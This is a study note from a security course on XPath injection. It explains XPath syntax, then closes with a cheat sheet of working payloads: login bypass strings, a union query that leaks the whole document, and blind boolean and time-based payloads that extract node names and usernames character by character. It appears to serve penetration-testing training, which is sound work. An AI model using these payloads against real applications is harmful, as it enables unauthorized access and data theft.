# XPath Injection
- [Introduction](#introduction)
    - [XPath Foundations](#xpath-foundations)
    - [Nodes](#nodes)
    - [Predicates](#predicates)
    - [Wildcards & Union](#wildcards--union)
- [Cheat Sheet](#cheat-sheet)
  - [Authentication Bypass](#authentication-bypass)
  - [Data Exfiltration](#data-exfiltration)



## Introduction 
- XML Path Language (XPath) is a query language for Extensible Markup Language (XML) data, similar to how SQL is a query language for databases. As such, XPath is used to query data from XML documents.

### XPath Foundations
- Ex. XML Document:
```xml
<?xml version="1.0" encoding="UTF-8"?>
  
<academy_modules>  
  <module>
    <title>Web Attacks</title>
    <author>21y4d</author>
    <tier difficulty="medium">2</tier>
    <category>offensive</category>
  </module>

  <!-- this is a comment -->
  <module>
    <title>Attacking Enterprise Networks</title>
    <author co-author="LTNB0B">mrb3n</author>
    <tier difficulty="medium">2</tier>
    <category>offensive</category>
  </module>
</academy_modules>
```
- An XML document usually begins with the XML declaration, which specifies the XML version and encoding. If the declaration is omitted, the XML parser assumes the version 1.0 and the encoding UTF-8.
- The data in an XML document is formatted in a **tree structure** consisting of nodes with the top element called the root element node. Furthermore, there are different types of nodes:
    - Element nodes such as module and title
    - Attribute nodes such as co-author="LTNB0B" or difficulty="medium"
    - Comment nodes such as this is a comment
    - Text nodes which contain character data from element or attribute nodes such as Web Attacks and LTNB0B
    - Namespace nodes and processing instruction nodes

### Nodes
- Each XPath query selects a set of nodes from the XML document. A query is evaluated from a context node, which marks the starting point. Therefore, depending on the context node, the same query may have different results. Here is an overview of the base cases of XPath queries for selecting nodes:

|Query|	Explanation|
|:----|:-----------|
|module|	Select all module child nodes of the context node|
|/|	Select the document root node|
|//|	Select descendant nodes of the context node|
|.|	Select the context node|
|..|	Select the parent node of the context node|
|@difficulty|	Select the difficulty attribute node of the context node|
|text()|	Select all text node child nodes of the context node|

- We can use these base cases to construct more complicated queries. To avoid ambiguity of the query result depending on the context node, we can start our query at the document root:

|Query|	Explanation|
|:----|:-----------|
|/academy_modules/module|	Select all module child nodes of academy_modules node|
|//module|	Select all module nodes|
|/academy_modules//title|	Select all title nodes that are descendants of the academy_modules node|
|/academy_modules/module/tier/@difficulty|	Select the difficulty attribute node of all tier element nodes under the specified path|
|//@difficulty|	Select all difficulty attribute nodes|

> [!NOTE]
> If a query starts with //, the query is evaluated from the document root and not at the context node.

### Predicates

- Predicates filter the result from an XPath query similar to the WHERE clause in a SQL query. Predicates are part of the XPath query and are contained within brackets `[]`. Here are some example predicates:

|Query|	Explanation|
|:----|:-----------|
|`/academy_modules/module[1]`|	Select the first module child node of the academy_modules node|
|`/academy_modules/module[position()=1]`|	Equivalent to the above query|
|`/academy_modules/module[last()]`|	Select the last module child node of the academy_modules node|
|`/academy_modules/module[position()<3]`|	Select the first two module child nodes of the academy_modules node|
|`//module[tier=2]/title`|	Select the title of all modules where the tier element node equals 2|
|`//module/author[@co-author]/../title`|	Select the title of all modules where the author element node has a co-author attribute node|
|`//module/tier[@difficulty="medium"]/..`|	Select all modules where the tier element node has a difficulty attribute node set to medium|

- Predicates support the following operands:

|Operand|	Explanation|
|:------|:-------------|
|+|	Addition|
|-|	Subtraction|
|*|	Multiplication|
|div|	Division|
|=|	Equal|
|!=|	Not Equal|
|<|	Less than|
|<=|	Less than or Equal|
|>|	Greater than|
|>=|	Greater than or Equal|
|or|	Logical Or|
|and|	Logical And|
|mod|	Modulus|

### Wildcards & Union

|Query|	Explanation|
|:----|:-----------|
|`node()`|	Matches any node|
|`*`|	Matches any element node|
|`@*`|	Matches any attribute node|

- We can use these wildcards to construct queries like so:

|Query|	Explanation|
|:----|:-----------|
|`//*`|	Select all element nodes in the document|
|`//module/author[@*]/..`|	Select all modules where the author element node has at least one attribute node of any kind|
|`/*/*/title`|	Select all title nodes that are exactly two levels below the document root|

> [!NOTE]
> The wildcard `*` matches any node but not any descendants like `//` does. Therefore, we need to specify the correct amount of wildcards in our query. In our example XML document, the query `/*/*/title` returns all module titles, but the query `/*/title` returns nothing.

- We can combine multiple XPath queries with the union operator | like so:

|Query|	Explanation|
|:----|:-----------|
|`//module[tier=2]/title/text() \| //module[tier=3]/title/text()`| 	Select the title of all modules in tiers 2 and 3|

## Cheat Sheet

### Authentication Bypass

|Description| 	Username| 	Query|
|:----------|:----------|:-------|
|Regular Authentication| 	htb-stdnt| 	`/users/user[username/text()='htb-stdnt' and password/text()='295362c2618a05ba3899904a6a3f5bc0']`|
|Bypass Authentication with known username| 	`admin' or '1'='1`| 	`/users/user[username/text()='admin' or '1'='1' and password/text()='21232f297a57a5a743894a0e4a801fc3']`|
|Bypass Authentication by position| 	`' or position()=1 or '`| 	`/users/user[username/text()='' or position()=1 or '' and password/text()='21232f297a57a5a743894a0e4a801fc3']`|
|Bypass Authentication by substring| 	`' or contains(.,'admin') or '`| 	`/users/user[username/text()='' or contains(.,'admin') or '' and password/text()='21232f297a57a5a743894a0e4a801fc3']`|

### Data Exfiltration

- Unrestricted:
  - Leak entire XML document via union injection: `| //text()`

- Restricted:
  - Determine schema depth via chain of wildcards `/*[1]`
  - iterate through XML schema by increasing the indices to exfiltrate the entire document step-by-step

Blind Data Exfiltration

Description 	Payload 	Query
Exfiltrating Node Name's Length 	invalid' or string-length(name(/*[1]))=1 and '1'='1 	/users/user[username='invalid' or string-length(name(/*[1]))=1 and '1'='1']
Exfiltrating Node Name 	invalid' or substring(name(/*[1]),1,1)='a' and '1'='1 	/users/user[username='invalid' or substring(name(/*[1]),1,1)='a' and '1'='1']
Exfiltrating Number of Child Nodes 	invalid' or count(/*[1]/*)=1 and '1'='1 	/users/user[username='invalid' or count(/*[1]/*)=1 and '1'='1']
Exfiltrating Value Length 	invalid' or string-length(/users/user[1]/username)=1 and '1'='1 	/users/user[username='invalid' or string-length(/users/user[1]/username)=1 and '1'='1']
Exfiltrating Value 	invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1 	/users/user[username='invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1']
Time-based

Force the web application to iterate over the entire XML document exponentially:
Code: xpath

count((//.)[count((//.))])

Determine whether the first letter of the "username" is "a" based on the time it takes: if it is, the query will utilize a significant processing time, otherwise, it won't.
Code: xpath

invalid' or substring(/users/user[1]/username,1,1)='a' and count((//.)[count((//.))]) and '1'='1

- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)